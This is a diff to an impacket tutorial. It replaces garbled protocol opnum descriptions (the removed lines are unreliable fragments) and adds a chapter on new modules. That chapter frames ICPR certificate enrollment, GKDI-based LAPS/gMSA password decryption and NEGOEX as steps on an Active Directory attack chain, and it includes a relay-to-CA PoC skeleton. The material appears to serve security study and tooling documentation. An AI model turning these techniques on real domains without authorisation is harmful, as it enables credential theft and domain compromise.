+11 : (SamrEnumerateGroupsInDomain, SamrEnumerateGroupsInDomainResponse),Enumerates all groups
+12 : (SamrCreateUserInDomain, SamrCreateUserInDomainResponse),Creates a user
+13 : (SamrEnumerateUsersInDomain, SamrEnumerateUsersInDomainResponse),Enumerates all users
+14 : (SamrCreateAliasInDomain, SamrCreateAliasInDomainResponse),Creates an alias
+15 : (SamrEnumerateAliasesInDomain, SamrEnumerateAliasesInDomainResponse),Enumerates all aliases
+16 : (SamrGetAliasMembership, SamrGetAliasMembershipResponse),Obtains the union of all aliases to which a given set of SIDs belongs
+17 : (SamrLookupNamesInDomain, SamrLookupNamesInDomainResponse),Converts a set of account names to a set of RIDs
+18 : (SamrLookupIdsInDomain, SamrLookupIdsInDomainResponse),Converts a set of RIDs to account names
+19 : (SamrOpenGroup, SamrOpenGroupResponse),Obtains a handle to a group given its RID
+20 : (SamrQueryInformationGroup, SamrQueryInformationGroupResponse),Gets attributes from a group object
+21 : (SamrSetInformationGroup, SamrSetInformationGroupResponse),Updates attributes of a group object
+22 : (SamrAddMemberToGroup, SamrAddMemberToGroupResponse),Adds a member to a group
+23 : (SamrDeleteGroup, SamrDeleteGroupResponse),Deletes a group object
+24 : (SamrRemoveMemberFromGroup, SamrRemoveMemberFromGroupResponse),Removes a member from a group
+25 : (SamrGetMembersInGroup, SamrGetMembersInGroupResponse),Reads the members of a group
+26 : (SamrSetMemberAttributesOfGroup, SamrSetMemberAttributesOfGroupResponse),Sets the attributes of a membership
+27 : (SamrOpenAlias, SamrOpenAliasResponse),Obtains a handle to an alias given its RID
+28 : (SamrQueryInformationAlias, SamrQueryInformationAliasResponse),Gets attributes from an alias object
+29 : (SamrSetInformationAlias, SamrSetInformationAliasResponse),Updates attributes of an alias object
+30 : (SamrDeleteAlias, SamrDeleteAliasResponse),Deletes an alias object
+31 : (SamrAddMemberToAlias, SamrAddMemberToAliasResponse),Adds a member to an alias
+32 : (SamrRemoveMemberFromAlias, SamrRemoveMemberFromAliasResponse),Removes a member from an alias
+33 : (SamrGetMembersInAlias, SamrGetMembersInAliasResponse),Obtains the membership list of an alias
+34 : (SamrOpenUser, SamrOpenUserResponse),Obtains a user handle given its RID
+35 : (SamrDeleteUser, SamrDeleteUserResponse),Deletes a user object
+36 : (SamrQueryInformationUser, SamrQueryInformationUserResponse),Gets attributes from a user object
+37 : (SamrSetInformationUser, SamrSetInformationUserResponse),Updates attributes of a user object
+38 : (SamrChangePasswordUser, SamrChangePasswordUserResponse),Changes the password of a user object
+39 : (SamrGetGroupsForUser, SamrGetGroupsForUserResponse),Obtains the list of groups a user belongs to
+40 : (SamrQueryDisplayInformation, SamrQueryDisplayInformationResponse),Gets a list of accounts, from a specified index, in ascending name order
+41 : (SamrGetDisplayEnumerationIndex, SamrGetDisplayEnumerationIndexResponse),Gets the index of an account list sorted in ascending account-name order
+44 : (SamrGetUserDomainPasswordInformation, SamrGetUserDomainPasswordInformationResponse),Gets password policy information (no domain handle required)
+45 : (SamrRemoveMemberFromForeignDomain, SamrRemoveMemberFromForeignDomainResponse),Removes a member from all aliases
+46 : (SamrQueryInformationDomain2, SamrQueryInformationDomain2Response),Gets attributes from a domain object
+47 : (SamrQueryInformationUser2, SamrQueryInformationUser2Response),Gets attributes from a user object
+48 : (SamrQueryDisplayInformation2, SamrQueryDisplayInformation2Response),Gets a list of accounts, from a specified index, in ascending name order
+49 : (SamrGetDisplayEnumerationIndex2, SamrGetDisplayEnumerationIndex2Response),Gets the index of the account list sorted ascending by account name, where the index is the position of the account whose name best matches the client-provided string
+50 : (SamrCreateUser2InDomain, SamrCreateUser2InDomainResponse),Creates a user
+51 : (SamrQueryDisplayInformation3, SamrQueryDisplayInformation3Response),Gets a list of accounts from a specified index in ascending name order
+52 : (SamrAddMultipleMembersToAlias, SamrAddMultipleMembersToAliasResponse),Adds multiple members to an alias
+53 : (SamrRemoveMultipleMembersFromAlias, SamrRemoveMultipleMembersFromAliasResponse),Removes multiple members from an alias
+54 : (SamrOemChangePasswordUser2, SamrOemChangePasswordUser2Response),Changes a user's password
+55 : (SamrUnicodeChangePasswordUser2, SamrUnicodeChangePasswordUser2Response),Changes a user account's password
+56 : (SamrGetDomainPasswordInformation, SamrGetDomainPasswordInformationResponse),Gets selected password policy information (no authentication to the server required)
+57 : (SamrConnect2, SamrConnect2Response),Returns a handle to the server object
+58 : (SamrSetInformationUser2, SamrSetInformationUser2Response),Updates attributes of a user object
+62 : (SamrConnect4, SamrConnect4Response),Obtains a handle to the server object
+64 : (SamrConnect5, SamrConnect5Response),Obtains a handle to the server object
+65 : (SamrRidToSid, SamrRidToSidResponse),Obtains the SID of an account given its RID
+66 : (SamrSetDSRMPassword, SamrSetDSRMPasswordResponse),Sets the local recovery password
+67 : (SamrValidatePassword, SamrValidatePasswordResponse),Validates an application password against the locally stored policy
 }
 ```
 
@@ -2750,53 +2757,53 @@ First let's see which interface methods the module implements:
 
 ```python
 OPNUMS = {
- 8 : (NetrConnectionEnum, NetrConnectionEnumResponse),
- 9 : (NetrFileEnum, NetrFileEnumResponse),
-10 : (NetrFileGetInfo, NetrFileGetInfoResponse),retrievesserverinformation
-11 : (NetrFileClose, NetrFileCloseResponse),serverin RPC_REQUEST NetrFileClose methodasservermustclosesserveronopensor
-12 : (NetrSessionEnum, NetrSessionEnumResponse),returns information aboutinserveronsessioninformation
-13 : (NetrSessionDel, NetrSessionDelResponse),
-14 : (NetrShareAdd, NetrShareAddResponse),shareserver
-15 : (NetrShareEnum, NetrShareEnumResponse),retrievesserveronshareinformation
-16 : (NetrShareGetInfo, NetrShareGetInfoResponse),
-17 : (NetrShareSetInfo, NetrShareSetInfoResponse),in ShareList setsshare
-18 : (NetrShareDel, NetrShareDelResponse),
-19 : (NetrShareDelSticky, NetrShareDelStickyResponse),
-20 : (NetrShareCheck, NetrShareCheckResponse),
-21 : (NetrServerGetInfo, NetrServerGetInfoResponse),retrieves CIFS SMB 1.0 servercurrentinformation
-22 : (NetrServerSetInfo, NetrServerSetInfoResponse),as CIFS SMB 1.0 serversetsservercanorsetsinformationin
- 23 : (NetrServerDiskEnum, NetrServerDiskEnumResponse),retrievesserverondriverlistthemethodreturns agroupgroupdriver
-24 : (NetrServerStatisticsGet, NetrServerStatisticsGetResponse),retrievesinformation
-25 : (NetrServerTransportAdd, NetrServerTransportAddResponse),
-26 : (NetrServerTransportEnum, NetrServerTransportEnumResponse),enumeratesserverinTransportListinformation
-27 : (NetrServerTransportDel, NetrServerTransportDelResponse),
-28 : (NetrRemoteTOD, NetrRemoteTODResponse),returnsserveroninformation
+ 8 : (NetrConnectionEnum, NetrConnectionEnumResponse),Lists all tree connections to shared resources on the server, or all tree connections made from a specific computer
+ 9 : (NetrFileEnum, NetrFileEnumResponse),Returns information about some or all open files on the server according to the specified parameters
+10 : (NetrFileGetInfo, NetrFileGetInfoResponse),Retrieves information about a particular open server resource
+11 : (NetrFileClose, NetrFileCloseResponse),The server receives NetrFileClose in an RPC_REQUEST packet; in response it must force-close an open instance of a resource on the server (for example a file, device or named pipe)
+12 : (NetrSessionEnum, NetrSessionEnumResponse),Returns information about sessions established on the server
+13 : (NetrSessionDel, NetrSessionDelResponse),Ends one or more network sessions between the server and a client
+14 : (NetrShareAdd, NetrShareAddResponse),Shares a server resource
+15 : (NetrShareEnum, NetrShareEnumResponse),Retrieves information about each shared resource on the server
+16 : (NetrShareGetInfo, NetrShareGetInfoResponse),Retrieves information about a specific shared resource on the server from the ShareList
+17 : (NetrShareSetInfo, NetrShareSetInfoResponse),Sets the parameters of a shared resource in the ShareList
+18 : (NetrShareDel, NetrShareDelResponse),Deletes a share name from the ShareList, disconnecting all connections to it; if the share is sticky, all its information is also removed from permanent storage
+19 : (NetrShareDelSticky, NetrShareDelStickyResponse),Clears the IsPersistent member of a Share in the ShareList, marking the share non-persistent
+20 : (NetrShareCheck, NetrShareCheckResponse),Checks whether the server is sharing a device
+21 : (NetrServerGetInfo, NetrServerGetInfoResponse),Retrieves the current configuration information of a CIFS and SMB 1.0 server
+22 : (NetrServerSetInfo, NetrServerSetInfoResponse),Sets server operating parameters for a CIFS and SMB 1.0 file server, separately or together; the information persists across reinitialisation
+ 23 : (NetrServerDiskEnum, NetrServerDiskEnumResponse),Retrieves the list of disk drives on the server, returning an array of three-character strings (drive letter, colon, terminating null)
+24 : (NetrServerStatisticsGet, NetrServerStatisticsGetResponse),Retrieves the operating statistics of the service
+25 : (NetrServerTransportAdd, NetrServerTransportAddResponse),Binds the server to a transport protocol
+26 : (NetrServerTransportEnum, NetrServerTransportEnumResponse),Enumerates information about the transport protocols managed by the server in the TransportList
+27 : (NetrServerTransportDel, NetrServerTransportDelResponse),Unbinds (disconnects) a transport protocol from the server; on success the server can no longer communicate with clients over that protocol (for example TCP or XNS)
+28 : (NetrRemoteTOD, NetrRemoteTODResponse),Returns the time information from the server
 30 : (NetprPathType, NetprPathTypeResponse),
 31 : (NetprPathCanonicalize, NetprPathCanonicalizeResponse),
 32 : (NetprPathCompare, NetprPathCompareResponse),
 33 : (NetprNameValidate, NetprNameValidateResponse),
 34 : (NetprNameCanonicalize, NetprNameCanonicalizeResponse),
 35 : (NetprNameCompare, NetprNameCompareResponse),
-36 : (NetrShareEnumSticky, NetrShareEnumStickyResponse),retrieves IsPersistent setsin ShareList setsshareinformation
+36 : (NetrShareEnumSticky, NetrShareEnumStickyResponse),Retrieves information about each sticky shared resource whose IsPersistent is set in the ShareList
 37 : (NetrShareDelStart, NetrShareDelStartResponse),
 38 : (NetrShareDelCommit, NetrShareDelCommitResponse),
 39 : (NetrpGetFileSecurity, NetrpGetFileSecurityResponse),
-40 : (NetrpSetFileSecurity, NetrpSetFileSecurityResponse),setsor
+40 : (NetrpSetFileSecurity, NetrpSetFileSecurityResponse),Sets the security of a file or directory
 41 : (NetrServerTransportAddEx, NetrServerTransportAddExResponse),
 43 : (NetrDfsGetVersion, NetrDfsGetVersionResponse),
 44 : (NetrDfsCreateLocalPartition, NetrDfsCreateLocalPartitionResponse),
-45 : (NetrDfsDeleteLocalPartition, NetrDfsDeleteLocalPartitionResponse),deletesserveronDFS share
+45 : (NetrDfsDeleteLocalPartition, NetrDfsDeleteLocalPartitionResponse),Deletes a DFS share on the server
 46 : (NetrDfsSetLocalVolumeState, NetrDfsSetLocalVolumeStateResponse),
-48 : (NetrDfsCreateExitPoint, NetrDfsCreateExitPointResponse),inserveroncreates aDFS
-49 : (NetrDfsDeleteExitPoint, NetrDfsDeleteExitPointResponse),deletesserveronDFS
+48 : (NetrDfsCreateExitPoint, NetrDfsCreateExitPointResponse),Creates a DFS link on the server
+49 : (NetrDfsDeleteExitPoint, NetrDfsDeleteExitPointResponse),Deletes a DFS link on the server
 50 : (NetrDfsModifyPrefix, NetrDfsModifyPrefixResponse),
 51 : (NetrDfsFixLocalVolume, NetrDfsFixLocalVolumeResponse),
-52 : (NetrDfsManagerReportSiteInfo, NetrDfsManagerReportSiteInfoResponse),obtainsthespecifiedserver Active Directory
-53 : (NetrServerTransportDelEx, NetrServerTransportDelExResponse),serverin RPC_REQUEST NetrServerTransportDelEx methodasserverserverorifthismethodserver specified TCP or XNSwithclient
-54 : (NetrServerAliasAdd, NetrServerAliasAddResponse),
-55 : (NetrServerAliasEnum, NetrServerAliasEnumResponse),
-56 : (NetrServerAliasDel, NetrServerAliasDelResponse),
-57 : (NetrShareDelEx, NetrShareDelExResponse),
+52 : (NetrDfsManagerReportSiteInfo, NetrDfsManagerReportSiteInfoResponse),Obtains the Active Directory site that should correspond to the specified server's coverage
+53 : (NetrServerTransportDelEx, NetrServerTransportDelExResponse),The server receives NetrServerTransportDelEx in an RPC_REQUEST packet; in response it unbinds (disconnects) a transport protocol, after which it can no longer communicate with clients over that protocol (for example TCP or XNS)
+54 : (NetrServerAliasAdd, NetrServerAliasAddResponse),Attaches an alias to an existing server name and inserts an alias object into the AliasList, through which shares can be accessed by server name or alias; aliases identify which resources are visible to SMB clients per tree connect
+55 : (NetrServerAliasEnum, NetrServerAliasEnumResponse),Retrieves a server's alias information by the specified alias or server name
+56 : (NetrServerAliasDel, NetrServerAliasDelResponse),Deletes an alias from the server alias list by the specified alias
+57 : (NetrShareDelEx, NetrShareDelExResponse),Deletes a share from the ShareList, disconnecting all connections to it; if the share is sticky, all its information is also removed from permanent storage
 }
 ```
 
@@ -2948,27 +2955,27 @@ The Workstation Service Remote Protocol remotely queries and configures certain 
 
 ```python
 OPNUMS = {
- 0 : (NetrWkstaGetInfo, NetrWkstaGetInfoResponse),returns information aboutinformationincludingname
- 1 : (NetrWkstaSetInfo, NetrWkstaSetInfoResponse),
- 2 : (NetrWkstaUserEnum, NetrWkstaUserEnumResponse),returns information aboutcurrentinonuserinformation
- 5 : (NetrWkstaTransportEnum, NetrWkstaTransportEnumResponse),
- 6 : (NetrWkstaTransportAdd, NetrWkstaTransportAddResponse),
+ 0 : (NetrWkstaGetInfo, NetrWkstaGetInfoResponse),Returns detailed information about the remote computer's configuration, including its name and the major/minor OS version
+ 1 : (NetrWkstaSetInfo, NetrWkstaSetInfoResponse),Configures the remote computer according to the information structure passed in the call
+ 2 : (NetrWkstaUserEnum, NetrWkstaUserEnumResponse),Returns detailed information about users currently active on the remote computer
+ 5 : (NetrWkstaTransportEnum, NetrWkstaTransportEnumResponse),Provides details on the transport protocols currently enabled on the remote computer's SMB network redirector
+ 6 : (NetrWkstaTransportAdd, NetrWkstaTransportAddResponse),Enables a transport protocol for the SMB network redirector on the remote computer
 # 7 : (NetrWkstaTransportDel, NetrWkstaTransportDelResponse),
- 8 : (NetrUseAdd, NetrUseAddResponse),inserver SMB serverservernotthismethod
- 9 : (NetrUseGetInfo, NetrUseGetInfoResponse),
-10 : (NetrUseDel, NetrUseDelResponse),
-11 : (NetrUseEnum, NetrUseEnumResponse),
-13 : (NetrWorkstationStatisticsGet, NetrWorkstationStatisticsGetResponse),returns information aboutonSMB information
-20 : (NetrGetJoinInformation, NetrGetJoinInformationResponse),retrievesspecified entrygroupordomaininformation
-22 : (NetrJoinDomain2, NetrJoinDomain2Response),
-23 : (NetrUnjoinDomain2, NetrUnjoinDomain2Response),
-24 : (NetrRenameMachineInDomain2, NetrRenameMachineInDomain2Response),
-25 : (NetrValidateName2, NetrValidateName2Response),
-26 : (NetrGetJoinableOUs2, NetrGetJoinableOUs2Response),returns agroup (OU)listusercaninobject
-27 : (NetrAddAlternateComputerName, NetrAddAlternateComputerNameResponse),asspecifiedserveraddsname
-28 : (NetrRemoveAlternateComputerName, NetrRemoveAlternateComputerNameResponse),deletes the specifiedservername
-29 : (NetrSetPrimaryComputerName, NetrSetPrimaryComputerNameResponse),setsspecifiedservername
- 30 : (NetrEnumerateComputerNames, NetrEnumerateComputerNamesResponse), returns the specifiedservernamelistqueriesname
+ 8 : (NetrUseAdd, NetrUseAddResponse),Establishes a connection between the workstation and an SMB server; the workstation should not allow this method to be called remotely
+ 9 : (NetrUseGetInfo, NetrUseGetInfoResponse),Retrieves details of a connection to a share on an SMB server from the remote workstation; the server should not allow remote calls
+10 : (NetrUseDel, NetrUseDelResponse),Terminates a connection from the workstation to a share on an SMB server; the server should not allow remote calls
+11 : (NetrUseEnum, NetrUseEnumResponse),Lists open connections between the workstation and remote SMB servers; the server should not allow remote calls
+13 : (NetrWorkstationStatisticsGet, NetrWorkstationStatisticsGetResponse),Returns various statistics about the SMB network redirector on the remote computer
+20 : (NetrGetJoinInformation, NetrGetJoinInformationResponse),Retrieves details of the workgroup or domain the specified computer has joined
+22 : (NetrJoinDomain2, NetrJoinDomain2Response),Joins a computer to a domain or workgroup using encrypted credentials
+23 : (NetrUnjoinDomain2, NetrUnjoinDomain2Response),Unjoins a computer from a workgroup or domain using encrypted credentials
+24 : (NetrRenameMachineInDomain2, NetrRenameMachineInDomain2Response),Changes the local persistent variable ComputerNameNetBIOS using encrypted credentials and optionally renames the server's machine account in the domain without first removing and re-adding it
+25 : (NetrValidateName2, NetrValidateName2Response),Validates the validity of a computer, workgroup, or domain name
+26 : (NetrGetJoinableOUs2, NetrGetJoinableOUs2Response),Returns a list of organizational units (OUs) in which the user can create objects
+27 : (NetrAddAlternateComputerName, NetrAddAlternateComputerNameResponse),Adds an alternate name for the specified server
+28 : (NetrRemoveAlternateComputerName, NetrRemoveAlternateComputerNameResponse),Deletes the alternate name of the specified server
+29 : (NetrSetPrimaryComputerName, NetrSetPrimaryComputerNameResponse),Sets the primary computer name of the specified server
+ 30 : (NetrEnumerateComputerNames, NetrEnumerateComputerNamesResponse),Returns the list of computer names of the specified server, where the result is determined by the name type
 }
 ```
 
@@ -3296,11 +3303,11 @@ The Directory Replication Service (DRS) Remote Protocol is an [RPC](https://lear
 The module implements the following methods:
 
 ```
- 0 : (DRSBind,DRSBindResponse ),creates aonhandlethismethod
- 1 : (DRSUnbind,DRSUnbindResponse ),methodIDL_DRSBindmethodonhandle
- 3 : (DRSGetNCChanges,DRSGetNCChangesResponse ),
- 12: (DRSCrackNames,DRSCrackNamesResponse ),ingroupobject returns
- 16: (DRSDomainControllerInfo,DRSDomainControllerInfoResponse ),retrievesdomainDCinformation
+ 0 : (DRSBind,DRSBindResponse ),Creates a context handle required to call any other method in this interface
+ 1 : (DRSUnbind,DRSUnbindResponse ),Destroys the context handle previously created by IDL_DRSBind
+ 3 : (DRSGetNCChanges,DRSGetNCChangesResponse ),Replicates updates from an NC replica on the server
+ 12: (DRSCrackNames,DRSCrackNamesResponse ),Looks up each of a set of objects in the directory and returns them to the caller in the requested format
+ 16: (DRSDomainControllerInfo,DRSDomainControllerInfoResponse ),Retrieves information about the domain controllers in a given domain
 ```
 
 AD is a database. By default each domain controller (DC) stores a copy of it as the file ntds.dit under %SystemRoot%\NTDS. The **AD database** is logically partitioned into three directory partitions, a.k.a. naming contexts (NCs): the Schema NC, the Configuration NC and the Domain NC. Every DC in the forest holds identical Schema and Configuration NCs (forest-wide data), while every DC in a domain holds an identical copy of that domain's Domain NC. A DC designated as a Global Catalog (GC) server additionally holds partial replicas of other domains' Domain NCs — every object from each domain, but only a subset of attributes.
@@ -4790,6 +4797,483 @@ WPS protocol support.
 WPS (Wi-Fi Protected Setup) is the early name of the WSC (Wi-Fi Simple Configuration) specification, a technology that simplifies configuring and using wireless networks in SOHO environments. For example, setting up a wireless network normally requires the admin to configure the AP's SSID and security properties (authentication, encryption...) and then communicate the SSID and passphrase to every user — fiddly for ordinary people. With WSC, users just enter a PIN, press the Push Button, or tap an NFC phone against an NFC-capable AP, and the security settings are configured automatically — after which the phone can join the network. Clearly far simpler than memorizing SSIDs and passphrases. WPS appeared shortly after the Wi-Fi Alliance (WFA) introduced WPA, and with WPA2 the WFA produced its upgrade, WSC.
 
 
+
+# Part VI New Interfaces & Case Studies
+
+impacket has settled into roughly one major release a year: **0.12.0** (Sep 2024), **0.13.0** (Oct 2025), **0.13.1** (May 2026), with master (0.14.0.dev) still absorbing new protocols. This part picks up where Parts I-V left off: it covers the RPC interfaces and support libraries added by those releases that the main text does not yet cover, then walks through two recent public vulnerabilities - **BadSuccessor (CVE-2025-53779)** and **CVE-2025-33073** - to show how to build your own PoC on top of impacket.
+
+## Chapter 8 New Interfaces and Support Libraries in impacket 0.12-0.14
+
+The modules added in this cycle are listed below. Most of them are not "another SAMR"; rather they fill the gaps on the AD attack chain that previously required custom code or third-party tooling: certificate enrollment, group key distribution, authentication negotiation, authorization enumeration, and ACL manipulation.
+
+| Module | Spec | Introduced | One-line purpose |
+| :--- | :--- | :--- | :--- |
+| `dcerpc/v5/icpr.py` | [MS-ICPR] ICertPassage | 0.13.0 | Submit certificate requests to an enterprise CA over RPC (AD CS) |
+| `dcerpc/v5/gkdi.py` | [MS-GKDI] Group Key Distribution | 0.12.0 | Fetch the group key envelope (DNSSEC root key protection / DPAPI-NG) |
+| `negoex.py` | [MS-NEGOEX] SPNEGO Extended Negotiation | 0.14.0.dev (master, unreleased) | Parse and build SPNEGO extended negotiation (NEGOEX) messages |
+| `dcerpc/v5/raa.py` | [MS-RAA] Remote Authorization API | master | Server-side authorization decision for a security descriptor |
+| `dcerpc/v5/scmr.py` | [MS-SCMR] Service Control Manager | long-standing | Remote service management (the layer under psexec / smbexec) |
+| `acl.py` | - | 0.13.1 | Reusable ACL read/write helpers for SMB/NTFS |
+| `dpapi_ng.py` | - | 0.12+ | DPAPI Next Generation (CNG) decryption for gMSA / dMSA / LAPSv2 |
+
+> Note: `scmr.py` is not new, but the main text never covered it alone; it is included here because it is key to understanding why lateral movement so often ends in "start a service". `negoex.py` currently lives only on master (0.14.0.dev) and is not in a release yet - cite the specific commit when you use it.
+
+### 8.1 [MS-ICPR] icpr.py - Certificate Enrollment over RPC (the AD CS channel)
+
+[MS-ICPR] (ICertPassage Remote Protocol) defines the RPC interface a client uses to submit a certificate request to an enterprise Certificate Authority (CA). Its RPC interface is named **ICertPassage**, normally exposed on the named pipe `\pipe\cert` (and discoverable via EPM). Its significance in AD CS attacks is that **the "relay to the CA and enroll" path no longer has to go through the HTTP enrollment endpoint (the classic ESC8 route) - it can be driven directly over RPC.**
+
+```python
+from impacket.uuid import uuidtup_to_bin
+
+MSRPC_UUID_ICPR = uuidtup_to_bin(("91ae6020-9e3c-11cf-8d7c-00aa00c091be", "0.0"))
+```
+
+The interface defines a single opnum 0 method, `CertServerRequest`. Its request and response reuse the `CERTTRANSBLOB` structure from [MS-WCCE] 2.2.2.2 (a length plus a byte array):
+
+```python
+class CERTTRANSBLOB(NDRSTRUCT):
+    structure = (
+        ("cb", ULONG),      # byte array length
+        ("pb", PBYTE),      # byte array contents
+    )
+
+class CertServerRequest(NDRCALL):
+    opnum = 0
+    structure = (
+        ("dwFlags", DWORD),
+        ("pwszAuthority", LPWSTR),        # CA name (may be empty, server default)
+        ("pdwRequestId", DWORD),          # request id, 0 on first call
+        ("pctbAttribs", CERTTRANSBLOB),   # newline-separated attributes, e.g. CertificateTemplate:User
+        ("pctbRequest", CERTTRANSBLOB),   # DER-encoded PKCS#10 CSR
+    )
+
+class CertServerRequestResponse(NDRCALL):
+    structure = (
+        ("pdwRequestId", DWORD),
+        ("pdwDisposition", ULONG),        # disposition: 3=issued, 5=pending
+        ("pctbCert", CERTTRANSBLOB),
+        ("pctbEncodedCert", CERTTRANSBLOB),       # issued certificate (DER)
+        ("pctbDispositionMessage", CERTTRANSBLOB),
+    )
+```
+
+The module ends with a helper, `hCertServerRequest`, that bundles the whole "join the attributes, convert the CSR, send the request, interpret the disposition" flow:
+
+```python
+def hCertServerRequest(
+    dce: DCERPC_v5,
+    csr: bytes,
+    attributes: List[str],
+    request_id: int = 0,
+    ca: str = ""
+) -> str:
+    attribs = checkNullString("\n".join(attributes)).encode("utf-16le")
+    pctb_attribs = CERTTRANSBLOB()
+    pctb_attribs["cb"] = len(attribs)
+    pctb_attribs["pb"] = attribs
+
+    pctb_request = CERTTRANSBLOB()
+    pctb_request["cb"] = len(csr)
+    pctb_request["pb"] = csr
+
+    request = CertServerRequest()
+    request["dwFlags"] = 0
+    request["pwszAuthority"] = checkNullString(ca)
+    request["pdwRequestId"] = request_id
+    request["pctbAttribs"] = pctb_attribs
+    request["pctbRequest"] = pctb_request
+
+    response = dce.request(request)
+    # ... pdwDisposition == 3 means success, == 5 means pending approval
+    return b"".join(response["pctbEncodedCert"]["pb"])
+```
+
+The minimal skeleton of a hand-written PoC follows: generate a key and a CSR with `cryptography`, then bind to ICertPassage and submit. `example/icpr_enroll_cert.py` is a complete, runnable version.
+
+```python
+# eg.example/icpr_enroll_cert.py (excerpt)
+from impacket.dcerpc.v5 import transport, epm, icpr
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+def enroll(target, ca_name, template, username, password, domain):
+    # 1. Resolve the dynamic ICertPassage endpoint via EPM, over ncacn_ip_tcp
+    binding = epm.hept_map(target, icpr.MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
+    rpctransport = transport.DCERPCTransportFactory(binding)
+    rpctransport.set_credentials(username, password, domain)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+    dce.bind(icpr.MSRPC_UUID_ICPR)
+
+    # 2. Generate a private key and a CSR with cryptography
+    key, csr_der = build_csr(template)
+
+    # 3. Submit: attributes are newline-separated; ca is the CA name (netbios\CA or its name)
+    cert_der = icpr.hCertServerRequest(dce, csr_der, ["CertificateTemplate:%s" % template], ca=ca_name)
+    dce.disconnect()
+    return key, cert_der
+```
+
+In the wild, `rpcattack.py` inside ntlmrelayx uses exactly this interface for its "relay to ICPR and enroll" attack (`ICPRRPCAttack`): after obtaining a relayed session it builds a CSR with `ADCSAttack.generate_csr`, calls `icpr.hCertServerRequest(...)`, and writes the certificate out as PKCS#12 (pfx). Because ICPR is a plaintext RPC channel, **if the CA enforces encryption / EPA the path fails** - which is why attackers still prefer the HTTP endpoint, but it also shows that closing one channel does not close the whole attack surface.
+
+### 8.2 [MS-GKDI] gkdi.py - Group Key Distribution Protocol
+
+[MS-GKDI] (Group Key Distribution Protocol) is how a client requests a "group key envelope" (Group Key Envelope, GKE) from the domain KDS (Key Distribution Service) root key. It serves two typical scenarios: DNSSEC root key protection, and **DPAPI-NG (CNG)** - that is, decryption of the "managed passwords" behind gMSA, dMSA and Windows LAPS v2.
+
+```python
+MSRPC_UUID_GKDI = uuidtup_to_bin(('B9785960-524F-11DF-8B6D-83DCDED72085', '1.0'))
+```
+
+This interface also has a single opnum 0 method, `GkdiRpcGetKey`:
+
+```python
+class GkdiRpcGetKey(NDRCALL):
+    opnum = 0
+    structure = (
+        ('cbTargetSD', ULONG),       # length of the target security descriptor
+        ('pbTargetSD', BYTE_ARRAY),  # target security descriptor: the server decides from it whether you may read the key
+        ('pRootKeyID', PGUID),
+        ('L0KeyID', LONG),
+        ('L1KeyID', LONG),
+        ('L2KeyID', LONG),
+    )
+```
+
+The helper `GkdiGetKey` is straightforward - pass the target security descriptor and the three index levels:
+
+```python
+def GkdiGetKey(dce, target_sd, l0=-1, l1=-1, l2=-1, root_key_id=NULL):
+    request = GkdiRpcGetKey()
+    request['cbTargetSD'] = len(target_sd)
+    request['pbTargetSD'] = target_sd.getData()
+    request['pRootKeyID'] = root_key_id
+    request['L0KeyID'] = l0
+    request['L1KeyID'] = l1
+    request['L2KeyID'] = l2
+    return dce.request(request)
+```
+
+The response is a byte string that must be parsed by `GroupKeyEnvelope`. The genuinely useful fields are **L1Key / L2Key** plus the KDF and encryption parameters - the raw material for deriving the concrete data key (KEK):
+
+```python
+class GroupKeyEnvelope(Structure):
+    structure = (
+        ('Version', '<L=0'),
+        ('Magic', '<L=0'),
+        # ... L0Index / L1Index / L2Index / RootKeyId ...
+        ('KdfAlgo', ':'), ('KdfPara', ':', KDFParameter),
+        ('SecAlgo', ':'), ('SecPara', ':'),
+        ('L1Key', ':'), ('L2Key', ':'),
+    )
+```
+
+The call path (see `getLAPSv2Decrypt` in `examples/GetLAPSPassword.py`) is fixed: parse the `KeyIdentifier` (carrying L0/L1/L2 and RootKeyId) out of the LAPS blob read from LDAP, then resolve GKDI's dynamic `ncacn_ip_tcp` endpoint with `hept_map` and bind:
+
+```python
+from impacket.dcerpc.v5.gkdi import MSRPC_UUID_GKDI, GkdiGetKey, GroupKeyEnvelope
+from impacket.dpapi_ng import EncryptedPasswordBlob, KeyIdentifier, compute_kek, unwrap_cek, decrypt_plaintext
+
+stringBinding = hept_map(destHost=target, remoteIf=MSRPC_UUID_GKDI, protocol='ncacn_ip_tcp')
+resp = GkdiGetKey(dce, target_sd=target_sd, l0=key_id['L0Index'], l1=key_id['L1Index'],
+                  l2=key_id['L2Index'], root_key_id=key_id['RootKeyId'])
+gke = GroupKeyEnvelope(b''.join(resp['pbbOut']))
+kek = compute_kek(gke, key_id)
+```
+
+The actual decryption once you hold the GKE belongs to DPAPI-NG (see section 8.7). `example/gkdi_get_key.py` is a standalone runnable example that fetches a key.
+
+### 8.3 [MS-NEGOEX] negoex.py - SPNEGO Extended Negotiation
+
+[MS-NEGOEX] (SPNEGO Extended Negotiation Security Mechanism) extends SPNEGO: plain SPNEGO does only a single OID exchange and cannot express "authentication mechanisms that need several round trips", nor metadata; NEGOEX adds an independent state machine for both. Inside SPNEGO, NEGOEX is identified by OID `1.3.6.1.4.1.311.2.2.30` and its messages carry the little-endian magic `NEGOEXTS` (`0x535458454f47454e`).
+
+```python
+MESSAGE_SIGNATURE = b'NEGOEXTS'
+NEGOEX_OID = b'\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e'
+AUTH_SCHEME_PKU2U = uuid.UUID('235f69ad-73fb-4dbc-8203-0629e739339b')
+CHECKSUM_SCHEME_RFC3961 = 1
+```
+
+NEGOEX defines eight message types, all preceded by a `MessageHeader` (signature + type + sequence number + header length + total length + ConversationId):
+
+```python
+class MESSAGE_TYPE(IntEnum):
+    INITIATOR_NEGO   = 0   # initiator negotiation (advertises supported mechanisms)
+    ACCEPTOR_NEGO    = 1   # acceptor negotiation
+    INITIATOR_META_DATA = 2
+    ACCEPTOR_META_DATA  = 3
+    CHALLENGE        = 4   # mechanism-specific challenge data
+    AP_REQUEST       = 5   # mechanism-specific authentication request data
+    VERIFY           = 6   # integrity check (RFC 3961 checksum)
+    ALERT            = 7   # alert
+```
+
+Every message type is wrapped in a `Structure` subclass - `NegoMessage`, `ExchangeMessage`, `VerifyMessage`, `AlertMessage` - and the module provides `parseNegoExToken` (split a concatenated NEGOEX token into its messages) and `createNegoMessage` / `createExchangeMessage` / `createVerifyMessage` / `createAlertMessage` (build messages). The actual exchange is driven by the `NegoExContext` state machine:
+
+```python
+class NegoExContext(object):
+    """Drives a NEGOEX negotiation as either initiator or acceptor."""
+
